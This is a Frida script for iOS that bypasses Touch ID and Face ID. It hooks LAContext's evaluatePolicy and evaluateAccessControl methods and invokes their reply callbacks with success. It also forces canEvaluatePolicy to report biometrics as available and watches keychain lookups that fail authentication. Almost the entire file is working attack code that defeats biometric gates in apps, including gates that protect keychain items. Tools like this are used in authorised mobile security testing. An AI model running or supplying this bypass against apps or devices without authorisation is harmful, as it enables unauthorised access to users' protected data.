/**
 * iOS Biometric (Touch ID / Face ID) Bypass
 * Hooks LAContext to bypass biometric authentication
 */

if (ObjC.available) {
    console.log("[*] iOS Biometric Bypass loaded");

    try {
        var LAContext = ObjC.classes.LAContext;

        if (LAContext) {
            // Hook evaluatePolicy:localizedReason:reply:
            var evaluatePolicy = LAContext['- evaluatePolicy:localizedReason:reply:'];

            Interceptor.attach(evaluatePolicy.implementation, {
                onEnter: function(args) {
                    var policy = args[2];
                    var reason = ObjC.Object(args[3]);
                    var reply = new ObjC.Block(args[4]);

                    console.log("[+] Biometric authentication requested");
                    console.log("    Policy: " + policy);
                    console.log("    Reason: " + reason);

                    // Call reply block with success
                    reply.implementation(true, null);
                    console.log("[+] Biometric bypass: Returning success");
                },
                onLeave: function(retval) {
                    // Already handled in onEnter
                }
            });

            // Hook canEvaluatePolicy:error: to report biometrics available
            var canEvaluatePolicy = LAContext['- canEvaluatePolicy:error:'];

            Interceptor.attach(canEvaluatePolicy.implementation, {
                onLeave: function(retval) {
                    retval.replace(1); // YES - biometrics available
                    console.log("[+] canEvaluatePolicy: Returning YES");
                }
            });

            // Hook biometryType property (iOS 11+)
            if (LAContext['- biometryType']) {
                Interceptor.attach(LAContext['- biometryType'].implementation, {
                    onLeave: function(retval) {
                        // Return Face ID type (2) or Touch ID (1)
                        console.log("[+] biometryType queried: " + retval);
                    }
                });
            }

            // Hook evaluateAccessControl:operation:localizedReason:reply: (Keychain integration)
            if (LAContext['- evaluateAccessControl:operation:localizedReason:reply:']) {
                Interceptor.attach(LAContext['- evaluateAccessControl:operation:localizedReason:reply:'].implementation, {
                    onEnter: function(args) {
                        var reason = ObjC.Object(args[4]);
                        var reply = new ObjC.Block(args[5]);

                        console.log("[+] Keychain biometric access requested: " + reason);

                        // Call reply with success
                        reply.implementation(true, null);
                        console.log("[+] Keychain biometric bypass: Returning success");
                    }
                });
            }

            console.log("[+] LAContext hooks installed");
        } else {
            console.log("[-] LAContext class not found");
        }

    } catch (e) {
        console.log("[-] Biometric bypass hook failed: " + e);
    }

    // Hook SecItemCopyMatching for keychain items with biometric protection
    try {
        var SecItemCopyMatching = Module.findExportByName("Security", "SecItemCopyMatching");
        if (SecItemCopyMatching) {
            Interceptor.attach(SecItemCopyMatching, {
                onEnter: function(args) {
                    console.log("[+] SecItemCopyMatching called");
                },
                onLeave: function(retval) {
                    if (retval.toInt32() === -25293) { // errSecAuthFailed
                        console.log("[+] Keychain auth failed - may need biometric bypass");
                    }
                }
            });
        }
    } catch (e) {
        console.log("[-] SecItemCopyMatching hook failed: " + e);
    }

    console.log("[*] Biometric Bypass hooks installed");

} else {
    console.log("[-] Objective-C runtime not available");
}
